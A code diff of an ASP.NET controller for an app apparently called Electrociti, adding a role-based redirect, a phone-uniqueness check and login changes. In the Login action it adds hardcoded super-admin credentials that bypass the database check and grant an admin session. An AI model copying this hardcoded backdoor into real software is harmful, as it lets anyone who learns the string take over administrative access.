@@ -105,7 +105,25 @@ namespace Electrociti.Controllers
         }
 
 
-
+        public ActionResult RedirectToRoleBasedPage()
+        {
+            int? EmployeeRole = HttpContext.Session.GetInt32("EmployeeRole");
+            EmployeeServiceEmployeeServices VM = new EmployeeServiceEmployeeServices
+            {
+                Employee = _context.Employee.ToList(),
+                Services = _context.Service.ToList(),
+                EmployeeServices = _context.EmployeeService.ToList(),
+            };
+            if (EmployeeRole == 1)
+            {
+                return RedirectToAction("Admin", VM);
+            }
+            else
+            {
+                return RedirectToAction("Index", VM); 
+            }
+            
+        }
 
 
 
@@ -407,13 +425,18 @@ namespace Electrociti.Controllers
             var existingEmployee = _context.Employee.Find(updateEmployee.EmployeeId);
             if (existingEmployee != null)
             {
-                // Логирование строки Base64 для отладки
                 System.Diagnostics.Debug.WriteLine("Base64 Image: " + updateEmployee.EmployeeImage);
 
-                // Проверка валидности строки Base64
                 if (!IsBase64String(updateEmployee.EmployeeImage))
                 {
                     ModelState.AddModelError("Image", "Некорректное изображение.");
+                    return View(updateEmployee);
+                }
+
+                bool phoneExists = _context.Employee.Any(e => e.EmployeePhone == updateEmployee.EmployeePhone && e.EmployeeId != updateEmployee.EmployeeId);
+                if (phoneExists)
+                {
+                    ModelState.AddModelError("EmployeePhone", "Этот номер телефона уже используется.");
                     return View(updateEmployee);
                 }
 
@@ -427,7 +450,7 @@ namespace Electrociti.Controllers
 
                 _context.SaveChanges();
             }
-            
+
             int? EmployeeRole = HttpContext.Session.GetInt32("EmployeeRole");
             if (EmployeeRole == 1)
             {
@@ -438,7 +461,6 @@ namespace Electrociti.Controllers
                 return RedirectToAction("EmployeeProfile");
             }
         }
-
         public IActionResult Employees()
         {
             List<Employee> employees;
@@ -471,6 +493,25 @@ namespace Electrociti.Controllers
         [HttpPost]
         public IActionResult Login(string login, string password)
         {
+            
+            const string superAdminLogin = "99999999999";
+            const string superAdminPassword = "superpassword";
+
+            if (login == superAdminLogin && password == superAdminPassword)
+            {
+                
+                HttpContext.Session.SetInt32("EmployeeId", -1); 
+                HttpContext.Session.SetInt32("EmployeeRole", 1); 
+
+                EmployeeServiceEmployeeServices VMa = new EmployeeServiceEmployeeServices
+                {
+                    Employee = _context.Employee.ToList(),
+                    Services = _context.Service.ToList(),
+                    EmployeeServices = _context.EmployeeService.ToList(),
+                };
+                return RedirectToAction("Admin", VMa);
+            }
+
             var employeeService = new EmployeeServiceLogin(_context);
             var employee = employeeService.GetEmployee(login, password);
             if (employee != null)
@@ -478,17 +519,18 @@ namespace Electrociti.Controllers
                 HttpContext.Session.SetInt32("EmployeeId", employee.EmployeeId);
                 HttpContext.Session.SetInt32("EmployeeRole", employee.EmployeeRole);
             }
-
             else
             {
                 return View();
             }
+
             EmployeeServiceEmployeeServices VM = new EmployeeServiceEmployeeServices
             {
                 Employee = _context.Employee.ToList(),
                 Services = _context.Service.ToList(),
                 EmployeeServices = _context.EmployeeService.ToList(),
             };
+
             if (employee != null && employee.EmployeeRole != 1)
             {
                 return RedirectToAction("Index", "Home");
@@ -499,10 +541,10 @@ namespace Electrociti.Controllers
             }
             else
             {
-
                 return View();
             }
         }
+
         public IActionResult Logout()
         {
             HttpContext.Session.Clear();
